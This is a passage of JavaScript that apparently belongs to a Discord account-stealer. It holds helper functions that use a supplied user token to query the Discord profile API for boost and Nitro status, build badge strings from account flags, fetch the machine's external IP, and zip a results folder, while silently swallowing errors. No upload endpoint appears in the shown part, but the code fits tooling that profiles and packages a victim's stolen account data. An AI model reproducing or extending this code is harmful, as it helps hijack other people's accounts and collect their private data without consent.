    const badge = badges[prop];
    if ((flags & badge.Value) == badge.Value && badge.Rare) Badges += badge.Emoji;
  }

  return Badges;
}

async function getNitro(flags, id, token) {
  switch (flags) {
    case 1:
      return "<:946246402105819216:962747802797113365>";
    case 2:
      const info = await axios
        .get(`https://discord.com/api/v9/users/${id}/profile`, {
          headers: {
            "Content-Type": "application/json",
            authorization: token,
          },
        })
        .then((response) => response.data)
        .catch(() => null);
      if (!info || !info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

      const boost = [
        "<:Booster1Month:1223996099027669064>",
        "<:Booster2Month:1223996099887501456>",
        "<:Booster3Month:1223996517250236519>",
        "<:Booster6Month:1223996101195989103>",
        "<:Booster9Month:1223996102810796182>",
        "<:Booster12Month:1223996719574814740>",
        "<:Booster15Month:1223996104044183563>",
        "<:BoosterLevel8:1223996106875207791>",
        "<:Booster24Month:1223996105549680742>",
      ];
      let i = 0;

      try {
        const d = new Date(info.premium_guild_since);
        const boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000);
        const d1 = new Date(info.premium_guild_since);
        const boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000);
        const d2 = new Date(info.premium_guild_since);
        const boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000);
        const d3 = new Date(info.premium_guild_since);
        const boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000);
        const d4 = new Date(info.premium_guild_since);
        const boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000);
        const d5 = new Date(info.premium_guild_since);
        const boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000);
        const d6 = new Date(info.premium_guild_since);
        const boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000);
        const d7 = new Date(info.premium_guild_since);
        const boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000);

        if (boost2month > 0) {
          i += 0;
        } else {
          i += 1;
        }
        if (boost3month > 0) {
          i += 0;
        } else {
          i += 1;
        }
        if (boost6month > 0) {
          i += 0;
        } else {
          i += 1;
        }
        if (boost9month > 0) {
          i += 0;
        } else {
          i += 1;
        }
        if (boost12month > 0) {
          i += 0;
        } else {
          i += 1;
        }
        if (boost15month > 0) {
          i += 0;
        } else {
          i += 1;
        }
        if (boost18month > 0) {
          i += 0;
        } else {
          i += 1;
        }
        if (boost24month > 0) {
          i += 0;
        } else if (boost24month < 0 || boost24month == 0) {
          i += 1;
        } else {
          i = 0;
        }
      } catch {}

      return `<:946246402105819216:962747802797113365> ${boost[i]}`;
    case 3:
      return "<:946246402105819216:962747802797113365>";
    default:
      return "`No Nitro`";
  }
}

async function getIp() {
  const ip = await axios.get("https://www.myexternalip.com/raw").catch(() => null);
  return ip?.data || "Unknown";
}


async function zipResult(basepath, savepath) {
    const archive = archiver("zip", { zlib: { level: 9 } });
    const stream = fs.createWriteStream(savepath);
    return new Promise((resolve, reject) => {
      try {
        archive
          .directory(basepath + "\\", false)
          .on("error", (err) => reject(err))
          .pipe(stream);
  
        stream.on("close", () => resolve(savepath));
        archive.finalize().then(() => {});
      } catch {}
    });
  }

process.on("uncaughtException", (err) => console.log(err)).on("unhandledRejection", (err) => console.log(err));
